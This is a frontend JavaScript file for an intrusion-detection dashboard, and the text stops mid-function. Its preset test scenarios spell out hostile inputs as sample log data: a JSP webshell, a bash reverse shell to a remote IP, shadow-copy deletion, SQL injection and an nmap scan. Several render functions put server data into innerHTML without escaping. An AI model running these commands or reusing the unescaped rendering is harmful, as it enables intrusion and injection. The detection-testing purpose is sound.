/* ═══════════════════════════════════════════
   Hybrid IDS — Frontend JavaScript
   ═══════════════════════════════════════════ */

"use strict";

// ───────────────────────────────────────────
// Theme (light / dark)
// ───────────────────────────────────────────
(function applyStoredTheme() {
  const saved = localStorage.getItem("ids-theme");
  if (saved === "light") {
    document.documentElement.setAttribute("data-theme", "light");
    const btn = document.getElementById("btn-theme");
    if (btn) btn.textContent = "☀️";
  }
})();

function toggleTheme() {
  const html    = document.documentElement;
  const btn     = document.getElementById("btn-theme");
  const isLight = html.getAttribute("data-theme") === "light";
  if (isLight) {
    html.removeAttribute("data-theme");
    localStorage.setItem("ids-theme", "dark");
    if (btn) btn.textContent = "🌙";
  } else {
    html.setAttribute("data-theme", "light");
    localStorage.setItem("ids-theme", "light");
    if (btn) btn.textContent = "☀️";
  }
}

// ── Chart instances ──
let chartSeverity = null;
let chartTypes    = null;

// ── Poll interval ──
let pollTimer = null;
let _pollStarted = false;

// ── Arch config load flag (prevents re-loading over unsaved changes) ──
let _archConfigLoaded = false;

// ───────────────────────────────────────────
// Init
// ───────────────────────────────────────────
// ─── Mobile sidebar toggle ───────────────────
function toggleSidebar() {
  const sidebar = document.querySelector(".sidebar");
  const overlay = document.getElementById("sidebar-overlay");
  const isOpen  = sidebar.classList.toggle("open");
  overlay.classList.toggle("active", isOpen);
}

function closeSidebar() {
  document.querySelector(".sidebar").classList.remove("open");
  document.getElementById("sidebar-overlay").classList.remove("active");
}

document.addEventListener("DOMContentLoaded", () => {
  // Wire up nav buttons via data-tab (avoids inline-onclick race on first load)
  document.querySelectorAll(".nav-btn[data-tab]").forEach(btn => {
    btn.addEventListener("click", () => {
      showTab(btn.dataset.tab);
      closeSidebar();   // Close drawer after nav on mobile
    });
  });

  updateClock();
  setInterval(updateClock, 1000);
  if (!_pollStarted) {   // Guard against double-init on hot-reload
    _pollStarted = true;
    startPolling();
  }
  buildCharts();
  showTab("tab-dashboard");
  loadArchConfig();   // pre-fill Modeller form with saved values on every page load
  updateTuneCount();  // initialise trial count badge from default input values
});

function updateClock() {
  const el = document.getElementById("footer-clock");
  if (el) el.textContent = new Date().toLocaleString("en-US");
}

// ───────────────────────────────────────────
// Tab navigation
// ───────────────────────────────────────────
function showTab(id) {
  document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
  document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));

  const tab = document.getElementById(id);
  if (tab) tab.classList.add("active");

  const idx = ["tab-dashboard","tab-alerts","tab-analyze","tab-process","tab-datalake","tab-checkpoints","tab-results"].indexOf(id);
  const btns = document.querySelectorAll(".nav-btn");
  if (btns[idx]) btns[idx].classList.add("active");

  if (id === "tab-alerts")      loadAlerts();
  if (id === "tab-checkpoints") { loadCheckpoints(); if (!_archConfigLoaded) loadArchConfig(); }
  if (id === "tab-dashboard")   loadMetrics();
  if (id === "tab-datalake")    loadDataLake();
  if (id === "tab-results")     loadTrainingHistory();
}

// ───────────────────────────────────────────
// Polling
// ───────────────────────────────────────────
function startPolling() {
  fetchStatus();
  pollTimer = setInterval(fetchStatus, 3000);
}

async function fetchStatus() {
  try {
    const r = await fetch("/api/status");
    const d = await r.json();
    updateStatusUI(d);
  } catch (_) {}
}

function updateStatusUI(d) {
  const init   = d.init   || {};
  const sess   = d.session|| {};
  const alerts = d.alert_status || {};

  // Badge
  const badge = document.getElementById("sys-badge");
  const msg   = document.getElementById("sys-msg");
  if (badge) {
    badge.className = "badge badge-" + (init.stage || "idle");
    badge.textContent = stageName(init.stage);
  }
  if (msg) msg.textContent = init.message || "";

  // Progress bar
  const bar  = document.getElementById("init-bar");
  const wrap = document.getElementById("init-bar-wrap");
  const lbl  = document.getElementById("init-label");
  if (init.stage === "initializing" || init.stage === "training") {
    wrap.classList.remove("hidden");
    bar.style.width = (init.progress || 0) + "%";
    if (lbl) lbl.textContent = init.message || "";
  } else {
    wrap.classList.add("hidden");
  }

  // KPI counters
  setEl("kpi-events", sess.total_events ?? "—");
  setEl("kpi-alerts", sess.total_alerts ?? "—");

  // Alert status
  setEl("ast-active", alerts.active ?? 0);
  setEl("ast-ack",    alerts.acknowledged ?? 0);
  setEl("ast-res",    alerts.resolved ?? 0);

  // Refresh metrics + dash-alerts if on dashboard tab
  if (document.getElementById("tab-dashboard").classList.contains("active")) {
    loadMetrics();
  }

  // Lock / unlock the batch upload zone based on system readiness
  const zone      = document.getElementById("batch-drop-zone");
  const fileInput = document.getElementById("batch-file-input");
  const batchHint = document.getElementById("batch-not-ready-hint");
  const isReady   = init.stage === "ready";
  if (zone) {
    if (isReady) {
      zone.classList.remove("zone-not-ready");
      zone.style.pointerEvents = "";
      zone.style.opacity = "";
      if (fileInput) fileInput.disabled = false;
      if (batchHint) batchHint.style.display = "none";
    } else {
      zone.classList.add("zone-not-ready");
      zone.style.pointerEvents = "none";
      zone.style.opacity = "0.45";
      if (fileInput) fileInput.disabled = true;
      const stageMsg = init.stage === "training"
        ? `System training… please wait (${init.message || ""})`
        : `System initializing… please wait`;
      if (batchHint) { batchHint.textContent = stageMsg; batchHint.style.display = "block"; }
    }
  }
}

function stageName(s) {
  const map = {
    idle: "Idle", initializing: "Initializing…",
    training: "Training…", ready: "Ready", error: "Error"
  };
  return map[s] || s || "—";
}

// ───────────────────────────────────────────
// System start / retrain
// ───────────────────────────────────────────
async function startSystem(forceRetrain) {
  const badge = document.getElementById("sys-badge");
  const currentStage = badge?.className?.replace("badge badge-", "") || "";

  // Already starting — skip re-trigger
  if (currentStage === "initializing" || currentStage === "training") return;

  // Already ready and not forcing — do nothing
  if (currentStage === "ready" && !forceRetrain) {
    const msg = document.getElementById("sys-msg");
    if (msg) { msg.textContent = "System already ready."; setTimeout(() => { msg.textContent = ""; }, 2500); }
    return;
  }

  const btn = forceRetrain
    ? document.getElementById("btn-retrain")
    : document.getElementById("btn-start");
  const origLabel = forceRetrain ? "Retrain" : "Start";
  if (btn) { btn.disabled = true; btn.textContent = "Starting…"; }

  try {
    await fetch("/api/start", {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ force_retrain: forceRetrain }),
    });
  } finally {
    setTimeout(() => {
      if (btn) { btn.disabled = false; btn.textContent = origLabel; }
    }, 3000);
  }
}

// ───────────────────────────────────────────
// Metrics & Charts (Dashboard)
// ───────────────────────────────────────────
async function loadMetrics() {
  try {
    const r = await fetch("/api/metrics");
    const d = await r.json();

    setEl("kpi-events",   d.total_events   ?? "—");
    setEl("kpi-alerts",   d.total_alerts   ?? "—");
    setEl("kpi-rate",     d.detection_rate != null ? d.detection_rate + "%" : "—");
    setEl("kpi-critical", d.severity_counts?.CRITICAL ?? "—");

    updateSeverityChart(d.severity_counts || {});
    updateTypesChart(d.top_attack_types  || []);
    updateDashAlerts();
  } catch (_) {}
}

function buildCharts() {
  const darkTick = { color: "#94a3b8" };
  const darkGrid = { color: "#334155" };

  // Severity donut
  const ctxS = document.getElementById("chart-severity").getContext("2d");
  chartSeverity = new Chart(ctxS, {
    type: "doughnut",
    data: {
      labels: ["CRITICAL","HIGH","MEDIUM","LOW"],
      datasets: [{
        data: [0,0,0,0],
        backgroundColor: ["#7f1d1d","#9a3412","#854d0e","#166534"],
        borderColor: "#1e293b",
        borderWidth: 2,
      }]
    },
    options: {
      responsive: true,
      plugins: {
        legend: { labels: { color: "#e2e8f0", font:{size:12} } }
      }
    }
  });

  // Types bar
  const ctxT = document.getElementById("chart-types").getContext("2d");
  chartTypes = new Chart(ctxT, {
    type: "bar",
    data: {
      labels: [],
      datasets: [{
        data: [],
        backgroundColor: "#38bdf8",
        borderRadius: 4,
      }]
    },
    options: {
      responsive: true,
      plugins: { legend: { display: false } },
      scales: {
        x: { ticks: darkTick, grid: darkGrid },
        y: { ticks: darkTick, grid: darkGrid, beginAtZero: true }
      }
    }
  });
}

function updateSeverityChart(counts) {
  if (!chartSeverity) return;
  chartSeverity.data.datasets[0].data = [
    counts.CRITICAL || 0,
    counts.HIGH     || 0,
    counts.MEDIUM   || 0,
    counts.LOW      || 0,
  ];
  chartSeverity.update("none");
}

function updateTypesChart(types) {
  if (!chartTypes) return;
  chartTypes.data.labels   = types.map(t => t.type);
  chartTypes.data.datasets[0].data = types.map(t => t.count);
  chartTypes.update("none");
}

async function updateDashAlerts() {
  try {
    const r = await fetch("/api/alerts?limit=8");
    const d = await r.json();
    renderDashAlerts(d.alerts || []);
  } catch (_) {}
}

function renderDashAlerts(alerts) {
  const tbody = document.getElementById("dash-alerts-body");
  if (!tbody) return;
  if (!alerts.length) {
    tbody.innerHTML = '<tr><td colspan="6" class="empty">No alerts yet — process an event</td></tr>';
    return;
  }
  tbody.innerHTML = alerts.map(a => `
    <tr>
      <td><code style="font-size:11px;color:#94a3b8">${a.alert_id}</code></td>
      <td><span class="chip chip-${a.severity}">${a.severity}</span></td>
      <td>${a.attack_type}</td>
      <td>${a.source_ip}</td>
      <td>${(a.confidence*100).toFixed(1)}%</td>
      <td style="color:#94a3b8;font-size:12px">${a.timestamp?.slice(0,19).replace("T"," ") || ""}</td>
    </tr>`).join("");
}

// ───────────────────────────────────────────
// Alerts Tab
// ───────────────────────────────────────────
async function loadAlerts() {
  const severity = document.getElementById("flt-severity")?.value || "";
  const reviewed = document.getElementById("flt-reviewed")?.value || "";

  let url = "/api/alerts?limit=100";
  if (severity) url += "&severity=" + severity;
  if (reviewed)  url += "&reviewed="  + reviewed;

  try {
    const r = await fetch(url);
    const d = await r.json();
    renderAlerts(d.alerts || []);
  } catch (_) {}
}

function renderAlerts(alerts) {
  const tbody = document.getElementById("alerts-body");
  if (!tbody) return;
  if (!alerts.length) {
    tbody.innerHTML = '<tr><td colspan="8" class="empty">No alerts found</td></tr>';
    return;
  }
  tbody.innerHTML = alerts.map(a => `
    <tr>
      <td><code style="font-size:11px;color:#94a3b8">${a.alert_id}</code></td>
      <td><span class="chip chip-${a.severity}">${a.severity}</span></td>
      <td>${a.attack_type}</td>
      <td>${a.source_ip}</td>
      <td>${a.destination_ip}</td>
      <td>${(a.confidence*100).toFixed(1)}%</td>
      <td>${a.reviewed
           ? `<span style="color:#22c55e;font-size:12px">✓ ${a.feedback||"Reviewed"}</span>`
           : '<span style="color:#f97316;font-size:12px">● Pending</span>'}</td>
      <td>
        ${!a.reviewed ? `
          <button class="btn btn-sm btn-secondary" onclick="ackAlert('${a.alert_id}')">Acknowledge</button>
          <button class="btn btn-sm btn-green" style="margin-left:4px" onclick="resolveAlert('${a.alert_id}','Confirmed')">Resolve</button>
        ` : ""}
      </td>
    </tr>`).join("");
}

async function ackAlert(id) {
  await fetch("/api/alert/acknowledge", {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({alert_id: id})
  });
  loadAlerts();
}

async function resolveAlert(id, label) {
  await fetch("/api/alert/resolve", {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({alert_id: id, label})
  });
  loadAlerts();
}

// ───────────────────────────────────────────
// Analyze Tab — Scenario Presets
// ───────────────────────────────────────────
const SCENARIOS = {
  ssh_brute: {
    src_ip:      "185.220.101.47",
    dst_ip:      "10.0.1.22",
    src_port:    58921,
    dst_port:    22,
    protocol:    "SSH",
    source_type: "IDS",
    severity:    "HIGH",
    attack_type: "Brute Force",
    payload:     "Failed password for root from 185.220.101.47 port 58921 ssh2; " +
                 "Failed password for admin from 185.220.101.47 port 58922 ssh2; " +
                 "Failed password for ubuntu from 185.220.101.47 port 58923 ssh2; " +
                 "Accepted password for root from 185.220.101.47 port 58924 ssh2 — " +
                 "repeated authentication failure then success, credential stuffing attack suspected.",
  },
  syn_flood: {
    src_ip:      "198.51.100.77",
    dst_ip:      "172.16.0.5",
    src_port:    0,
    dst_port:    80,
    protocol:    "TCP",
    source_type: "Firewall",
    severity:    "CRITICAL",
    attack_type: "DoS",
    payload:     "SYN flood detected: 48,000 SYN packets/sec from 198.51.100.77 to port 80. " +
                 "TCP flags: SYN only, no ACK. Sequence numbers randomized. " +
                 "Half-open connection table exhausted (65535/65535). " +
                 "Volumetric DDoS — target web server unresponsive.",
  },
  sql_inj: {
    src_ip:      "91.108.4.200",
    dst_ip:      "192.168.10.50",
    src_port:    52314,
    dst_port:    443,
    protocol:    "HTTPS",
    source_type: "IPS",
    severity:    "CRITICAL",
    attack_type: "Probe",
    payload:     "POST /login HTTP/1.1 — username=' OR '1'='1'; DROP TABLE users; -- " +
                 "User-Agent: sqlmap/1.7.8; " +
                 "X-Forwarded-For: 91.108.4.200; " +
                 "Payload detected by WAF rule SQL_INJECTION_001. " +
                 "Error-based SQLi attempt against MySQL backend, 14 requests in 3 seconds.",
  },
  port_scan: {
    src_ip:      "203.0.113.99",
    dst_ip:      "10.10.0.1",
    src_port:    61000,
    dst_port:    0,
    protocol:    "TCP",
    source_type: "IDS",
    severity:    "MEDIUM",
    attack_type: "Probe",
    payload:     "Nmap 7.94 SYN stealth scan: nmap -sS -p 1-65535 -T4 10.10.0.0/24. " +
                 "Ports contacted: 22, 23, 25, 80, 110, 135, 139, 443, 445, 3306, 3389, 8080. " +
                 "RST responses: 11 open ports discovered (22, 80, 443, 3306, 3389). " +
                 "OS fingerprint: Windows Server 2019 (TTL=128). Recon phase of multi-stage attack.",
  },
  ransomware_c2: {
    src_ip:      "10.5.3.88",
    dst_ip:      "185.243.115.90",
    src_port:    49701,
    dst_port:    443,
    protocol:    "HTTPS",
    source_type: "SIEM",
    severity:    "CRITICAL",
    attack_type: "R2L",
    payload:     "Outbound C2 beacon: encrypted HTTPS POST to known LockBit 3.0 C2 server 185.243.115.90. " +
                 "Beacon interval: 60s. TLS cert self-signed, CN=update-service.com. " +
                 "Internal host 10.5.3.88 previously accessed phishing email attachment (invoice.xlsm). " +
                 "File encryption process started: 312 files renamed to .lockbit3 extension. " +
                 "Shadow copies deleted: vssadmin delete shadows /all /quiet.",
  },
  dns_amp: {
    src_ip:      "0.0.0.0",
    dst_ip:      "192.0.2.1",
    src_port:    53,
    dst_port:    53,
    protocol:    "UDP",
    source_type: "Firewall",
    severity:    "HIGH",
    attack_type: "DoS",
    payload:     "DNS amplification DDoS: spoofed ANY queries for 'isc.org' sent to 15,000+ open resolvers. " +
                 "Amplification factor: 73x (60 byte query → 4,379 byte response). " +
                 "Attack bandwidth: 120 Gbps targeting 192.0.2.1. " +
                 "Source IPs spoofed as victim address. " +
                 "Recursive resolvers abused: 8.8.8.8, 1.1.1.1, 9.9.9.9 observed in traffic. " +
                 "Uplink saturation: 98%.",
  },
  rce_exploit: {
    src_ip:      "45.155.205.233",
    dst_ip:      "172.20.0.10",
    src_port:    44231,
    dst_port:    8080,
    protocol:    "HTTP",
    source_type: "IPS",
    severity:    "CRITICAL",
    attack_type: "U2R",
    payload:     "CVE-2023-44487 (HTTP/2 Rapid Reset) exploit attempt. " +
                 "HTTP/2 HEADERS + RST_STREAM flood: 2,000 streams/sec, immediately cancelled. " +
                 "Target: Apache Tomcat 9.0.80 on port 8080 — unpatched. " +
                 "Followed by webshell upload: POST /upload?filename=shell.jsp " +
                 "Content: <%Runtime.getRuntime().exec(request.getParameter('cmd'));%>. " +
                 "Reverse shell spawned: bash -i >& /dev/tcp/45.155.205.233/4444 0>&1.",
  },

  // ── Normal Senaryolar ──────────────────────────────────────────────
  normal_web: {
    src_ip:      "192.168.1.105",
    dst_ip:      "93.184.216.34",
    src_port:    54312,
    dst_port:    443,
    protocol:    "HTTPS",
    source_type: "Firewall",
    severity:    "LOW",
    attack_type: "Normal",
    payload:     "Normal HTTPS web traffic: GET /index.html HTTP/2 200 OK. " +
                 "TLS 1.3, SNI=example.com. Bytes transferred: 14,820 (req) / 182,440 (resp). " +
                 "Session duration: 4.2s. User-Agent: Mozilla/5.0 Chrome/124. " +
                 "No anomalies detected. Connection closed gracefully (FIN/ACK).",
  },
  normal_ssh: {
    src_ip:      "10.0.0.25",
    dst_ip:      "10.0.0.5",
    src_port:    52100,
    dst_port:    22,
    protocol:    "SSH",
    source_type: "IDS",
    severity:    "LOW",
    attack_type: "Normal",
    payload:     "Normal SSH session: sysadmin@10.0.0.25 → 10.0.0.5:22. " +
                 "Authentication: RSA public-key (successful, single attempt). " +
                 "Commands: ls -la, df -h, systemctl status nginx, exit. " +
                 "Session duration: 3 min 12 sec. Bytes transferred: recv 2,148 / sent 8,312. " +
                 "Access from known admin IP within expected maintenance window.",
  },
  normal_dns: {
    src_ip:      "192.168.5.20",
    dst_ip:      "8.8.8.8",
    src_port:    49200,
    dst_port:    53,
    protocol:    "DNS",
    source_type: "SIEM",
    severity:    "LOW",
    attack_type: "Normal",
    payload:     "Normal DNS queries: A record for api.github.com → 140.82.121.6 (TTL 60s). " +
                 "Query type: standard recursive. Client: internal workstation 192.168.5.20. " +
                 "Response time: 12ms. Within daily average query count (142/hour). " +
                 "No NXDOMAIN, no amplification, no tunneling indicators.",
  },
  normal_db: {
    src_ip:      "10.10.2.15",
    dst_ip:      "10.10.2.50",
    src_port:    41800,
    dst_port:    5432,
    protocol:    "TCP",
    source_type: "SOAR",
    severity:    "LOW",
    attack_type: "Normal",
    payload:     "Normal PostgreSQL queries: app server 10.10.2.15 → DB 10.10.2.50:5432. " +
                 "Query: SELECT id, name, email FROM users WHERE id=$1 (parameterized, safe). " +
                 "Avg response: 2.1ms, 35 rows returned. " +
                 "Connection pool: 8/20 active. Auth: application service account (MD5). " +
                 "No SQL injection indicators, within normal workload.",
  },
};

function fillScenario(key) {
  if (!key) return;
  const s = SCENARIOS[key];
  if (!s) return;

  document.getElementById("a-src-ip").value      = s.src_ip;
  document.getElementById("a-dst-ip").value      = s.dst_ip;
  document.getElementById("a-src-port").value    = s.src_port;
  document.getElementById("a-dst-port").value    = s.dst_port;
  document.getElementById("a-attack-type").value = s.attack_type;
  document.getElementById("a-payload").value     = s.payload;

  // Set <select> values
  ["a-protocol","a-source-type","a-severity"].forEach((id, i) => {
    const val = [s.protocol, s.source_type, s.severity][i];
    const el  = document.getElementById(id);
    if (!el) return;
    const opt = [...el.options].find(o => o.value === val);
    if (opt) el.value = val;
  });

  // Clear previous results
  const card = document.getElementById("analyze-result-card");
  if (card) card.style.display = "none";
}

async function analyzeEvent() {
  const btn = document.getElementById("btn-analyze");
  btn.disabled = true;
  btn.textContent = "Analyzing…";

  const payload = {
    source_ip:       document.getElementById("a-src-ip").value,
    destination_ip:  document.getElementById("a-dst-ip").value,
    source_port:     document.getElementById("a-src-port").value,
    destination_port:document.getElementById("a-dst-port").value,
    protocol:        document.getElementById("a-protocol").value,
    source_type:     document.getElementById("a-source-type").value,
    severity:        document.getElementById("a-severity").value,
    attack_type:     document.getElementById("a-attack-type").value,
    payload:         document.getElementById("a-payload").value,
  };

  try {
    const r = await fetch("/api/analyze", {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify(payload)
    });
    const d = await r.json();

    const card = document.getElementById("analyze-result-card");
    const res  = document.getElementById("analyze-result");
    card.style.display = "block";

    if (d.error) {
      res.innerHTML = `<div style="padding:16px;color:#ef4444">${d.error}</div>`;
      return;
    }

    const fusion = d.fusion || {};
    const agents = d.agents || {};
    const isInt  = fusion.is_intrusion;
    const score  = (fusion.final_score || 0) * 100;
    const barColor = score > 70 ? "#ef4444" : score > 40 ? "#f97316" : "#22c55e";

    const agentRows = [
      ["CNN (PyTorch)", agents.cnn,    "cnn"],
      ["RNN (PyTorch)", agents.rnn,    "rnn"],
      ["LLM Analizi",  agents.llm,    "llm"],
      ["Quantum AI",   agents.quantum, "quantum"],
    ].map(([name, v, key]) => {
      if (!v) {
        return `<div class="agent-box">
          <div class="agent-box-title">${name}</div>
          <div class="agent-box-val" style="color:#64748b">—</div>
          <div style="font-size:11px;color:#475569;margin-top:4px">Veri yok</div>
        </div>`;
      }
      const cls = v.prediction === 1 ? "val-intrusion" : "val-normal";
      const det = v.details || {};
      let extraLines = "";
      if (key === "cnn") {
        const cnnRaw = det.cnn_probability != null ? (det.cnn_probability * 100).toFixed(1) + "%" : null;
        const knnP   = det.knn_probability  != null ? (det.knn_probability  * 100).toFixed(1) + "%" : null;
        if (cnnRaw) extraLines += `<div style="font-size:10px;color:#64748b;margin-top:2px">CNN raw: ${cnnRaw}</div>`;
        if (knnP)   extraLines += `<div style="font-size:10px;color:#7dd3fc;margin-top:1px">k-NN score: ${knnP}</div>`;
      }
      return `<div class="agent-box">
        <div class="agent-box-title">${name}</div>
        <div class="agent-box-val ${cls}">${v.label}</div>
        <div style="font-size:11px;color:#94a3b8;margin-top:4px">Confidence: ${(v.confidence*100).toFixed(1)}%</div>
        ${extraLines}
      </div>`;
    }).join("");

    const sim = agents.similarity || {};
    const simBox = `<div class="agent-box">
      <div class="agent-box-title">Cosine Similarity</div>
      <div class="agent-box-val ${sim.is_anomaly ? 'val-intrusion':'val-normal'}">${sim.is_anomaly ? 'Anomaly':'Normal'}</div>
      <div style="font-size:11px;color:#94a3b8;margin-top:4px">Score: ${((sim.similarity_score||0)*100).toFixed(1)}%</div>
    </div>`;

    const agentScoreChips = Object.entries(fusion.agent_scores || {})
      .map(([k,v]) => `<span class="score-chip">${k}: ${(v*100).toFixed(0)}%</span>`)
      .join("");

    const alertBox = d.alert ? `
      <div style="margin:14px;padding:12px;background:#7f1d1d22;border:1px solid #ef4444;border-radius:8px">
        <div style="font-weight:700;color:#ef4444;margin-bottom:6px">🚨 Alert Generated</div>
        <div style="font-size:12px;color:#fca5a5">
          <strong>${d.alert.alert_id}</strong> — ${d.alert.attack_type} 
          [${d.alert.severity}] — Confidence: ${(d.alert.confidence*100).toFixed(1)}%
        </div>
      </div>` : `
      <div style="margin:14px;padding:12px;background:#16653422;border:1px solid #22c55e;border-radius:8px">
        <div style="font-weight:700;color:#22c55e">✓ Clean — No Alert Generated</div>
      </div>`;

    res.innerHTML = `
      <div class="agent-result-grid">${agentRows}${simBox}</div>
      <div class="fusion-result">
        <div style="font-weight:700;font-size:14px;margin-bottom:8px">
          Fusion Decision:
          <span style="color:${isInt?'#ef4444':'#22c55e'}">${isInt ? '🔴 ATTACK' : '✅ NORMAL'}</span>
          <span style="float:right;font-size:12px;color:#94a3b8">Score: ${score.toFixed(1)}%</span>
        </div>
        <div class="fusion-score-bar">
          <div class="fusion-score-fill" style="width:${score}%;background:${barColor}"></div>
        </div>
        <div class="agent-scores">${agentScoreChips}</div>
      </div>
      ${alertBox}`;
  } catch (e) {
    document.getElementById("analyze-result").innerHTML =
      `<div style="padding:16px;color:#ef4444">Error: ${e.message}</div>`;
    document.getElementById("analyze-result-card").style.display = "block";
  } finally {
    btn.disabled = false;
    btn.textContent = "Analyze";
  }
}

// ───────────────────────────────────────────
// Batch Prediction Tab
// ───────────────────────────────────────────

let _batchJobId   = null;
let _batchTimer   = null;
let _batchResults = [];

function batchDrop(e) {
  e.preventDefault();
  const file = e.dataTransfer?.files?.[0];
  if (file) startBatchPredict(file);
}

function batchFileSelected(input) {
  if (input.files?.[0]) startBatchPredict(input.files[0]);
  input.value = "";
}

async function startBatchPredict(file) {
  if (!file.name.toLowerCase().endsWith(".csv")) {
    alert("Please select a CSV file."); return;
  }

  // Guard: do not allow upload while system is still initializing
  const badge = document.getElementById("sys-badge");
  const stage = (badge?.className || "").replace("badge badge-", "");
  if (stage !== "ready") {
    const hint = document.getElementById("batch-not-ready-hint");
    if (hint) { hint.style.display = "block"; }
    return;
  }

  _batchResults = [];
  _batchJobId   = null;
  if (_batchTimer) { clearInterval(_batchTimer); _batchTimer = null; }

  // Reset UI
  setEl("batch-prog-label", `${file.name} uploading…`);
  setEl("batch-prog-count", "");
  document.getElementById("batch-prog-bar").style.width = "0%";
  document.getElementById("batch-progress-wrap").style.display = "block";
  document.getElementById("batch-summary").style.display = "none";
  document.getElementById("batch-result-card").style.display = "none";
  document.getElementById("batch-result-body").innerHTML =
    '<tr><td colspan="9" class="empty">Processing…</td></tr>';

  const zone = document.getElementById("batch-drop-zone");
  zone.classList.add("uploading");

  const form = new FormData();
  form.append("file", file);

  try {
    const r = await fetch("/api/batch-predict", { method: "POST", body: form });
    const d = await r.json();
    zone.classList.remove("uploading");

    if (d.error) {
      setEl("batch-prog-label", "Error: " + d.error);
      return;
    }

    _batchJobId = d.job_id;
    setEl("batch-prog-label", `Processing: ${file.name}`);
    _batchTimer = setInterval(() => pollBatchStatus(d.total), 1200);
  } catch (e) {
    zone.classList.remove("uploading");
    setEl("batch-prog-label", "Connection error: " + e.message);
  }
}

async function pollBatchStatus(totalExpected) {
  if (!_batchJobId) return;
  try {
    const r = await fetch(`/api/batch-status/${_batchJobId}`);
    const d = await r.json();

    const pct = d.total > 0 ? Math.round((d.done / d.total) * 100) : 0;
    document.getElementById("batch-prog-bar").style.width = pct + "%";
    setEl("batch-prog-count", `${d.done} / ${d.total}`);

    // Live-render new rows
    if (d.results && d.results.length > _batchResults.length) {
      _batchResults = d.results;
      renderBatchRows(_batchResults);
      updateBatchSummary(_batchResults);
      document.getElementById("batch-result-card").style.display = "block";
      document.getElementById("batch-summary").style.display = "flex";
    }

    if (d.status === "done") {
      clearInterval(_batchTimer); _batchTimer = null;
      setEl("batch-prog-label", `✓ Completed — ${d.total} events processed`);
    } else if (d.status === "error") {
      clearInterval(_batchTimer); _batchTimer = null;
      setEl("batch-prog-label", "Error: " + (d.error || "unknown"));
    } else {
      setEl("batch-prog-label", `Processing… (${d.done}/${d.total})`);
    }
  } catch (_) {}
}

function renderBatchRows(rows) {
  const tbody = document.getElementById("batch-result-body");
  if (!tbody) return;
  tbody.innerHTML = rows.map(r => {
    const isInt = r.is_intrusion;
    const color = isInt ? "#ef4444" : "#22c55e";
    const icon  = isInt ? "🔴" : "✅";
    return `<tr>
      <td style="color:var(--text2)">${r.row}</td>
      <td><span style="color:${color};font-weight:700">${icon} ${isInt?"ATTACK":"NORMAL"}</span></td>
      <td>
        <div class="mini-bar-bg">
          <div class="mini-bar-fill" style="width:${Math.round(r.score*100)}%;background:${color}"></div>
        </div>
        <span style="font-size:11px;color:var(--text2)">${(r.score*100).toFixed(1)}%</span>
      </td>
      <td style="font-size:12px">${(r.cnn*100).toFixed(0)}%</td>
      <td style="font-size:12px">${(r.rnn*100).toFixed(0)}%</td>
      <td style="font-size:12px">${(r.sim*100).toFixed(0)}%</td>
      <td style="font-size:12px">${(r.llm*100).toFixed(0)}%</td>
      <td style="font-size:12px">${(r.quantum*100).toFixed(0)}%</td>
      <td style="font-size:11px;color:var(--text2)">${r.alert_id
        ? `<span style="color:#ef4444">${r.alert_id}</span>` : "—"}</td>
    </tr>`;
  }).join("");
}

function updateBatchSummary(rows) {
  const total      = rows.length;
  const intrusions = rows.filter(r => r.is_intrusion).length;
  const normals    = total - intrusions;
  const rate       = total > 0 ? Math.round(intrusions / total * 100) : 0;
  setEl("bs-total",      total);
  setEl("bs-intrusions", intrusions);
  setEl("bs-normals",    normals);
  setEl("bs-rate",       rate + "%");
}

function exportBatchCSV() {
  if (!_batchResults.length) return;
  const header = "row,is_intrusion,fusion_score,cnn,rnn,cosine,llm,quantum,alert_id\n";
  const body   = _batchResults.map(r =>
    [r.row, r.is_intrusion?1:0, r.score, r.cnn, r.rnn, r.sim, r.llm, r.quantum, r.alert_id||""].join(",")
  ).join("\n");
  const blob = new Blob([header + body], { type: "text/csv" });
  const url  = URL.createObjectURL(blob);
  const a    = Object.assign(document.createElement("a"),
    { href: url, download: "batch_results.csv" });
  a.click();
  URL.revokeObjectURL(url);
}

// ───────────────────────────────────────────
// Dataset Training Tab
// ───────────────────────────────────────────

let _trainPollTimer = null;

function trainFileSelected(input) {
  const file = input.files?.[0];
  input.value = "";
  if (!file) return;
  if (!file.name.toLowerCase().endsWith(".csv")) {
    alert("Please select a CSV file."); return;
  }
  setEl("train-file-name", file.name);
  startDatasetTrain(file);
}

async function startDatasetTrain(file) {
  if (_trainPollTimer) { clearInterval(_trainPollTimer); _trainPollTimer = null; }

  document.getElementById("train-progress-wrap").style.display = "block";
  document.getElementById("train-metrics").style.display       = "none";
  document.getElementById("train-prog-bar").style.width        = "0%";
  setEl("train-prog-label", `${file.name} uploading…`);
  setEl("train-prog-pct",   "0%");

  const form = new FormData();
  form.append("file", file);

  try {
    const r = await fetch("/api/dataset-train", { method: "POST", body: form });
    const d = await r.json();

    if (d.error) {
      setEl("train-prog-label", "Error: " + d.error);
      return;
    }

    setEl("train-prog-label", "Training started…");
    _trainPollTimer = setInterval(pollTrainStatus, 1500);
  } catch (e) {
    setEl("train-prog-label", "Connection error: " + e.message);
  }
}

async function pollTrainStatus() {
  try {
    const r = await fetch("/api/train-status");
    const d = await r.json();

    document.getElementById("train-prog-bar").style.width = (d.progress || 0) + "%";
    setEl("train-prog-label", d.message || "");
    setEl("train-prog-pct",   (d.progress || 0) + "%");

    if (d.stage === "done") {
      clearInterval(_trainPollTimer); _trainPollTimer = null;
      renderTrainMetrics(d);
      loadCheckpoints();
    } else if (d.stage === "error") {
      clearInterval(_trainPollTimer); _trainPollTimer = null;
      setEl("train-prog-label", "Error: " + (d.error || "unknown"));
    }
  } catch (_) {}
}

function renderTrainMetrics(d) {
  const m  = d.metrics || {};
  const s  = d.schema  || {};

  // ── badge row ──────────────────────────────────────────────
  const fmt  = m.dataset_format || s.format || "—";
  const mode = m.training_mode === "direct" ? "Direkt Mod" : "Embedding Mod";
  setEl("tm-badge-format", fmt);
  setEl("tm-badge-mode",   mode);

  const dt = d.last_run
    ? new Date(d.last_run).toLocaleString("en-US", { dateStyle:"short", timeStyle:"short" })
    : "—";
  setEl("tm-badge-date", "Last trained: " + dt);

  // ── stat cards ─────────────────────────────────────────────
  setEl("tm-samples",  m.samples   != null ? m.samples.toLocaleString()  : "—");
  setEl("tm-features", m.n_features != null ? m.n_features               : "—");
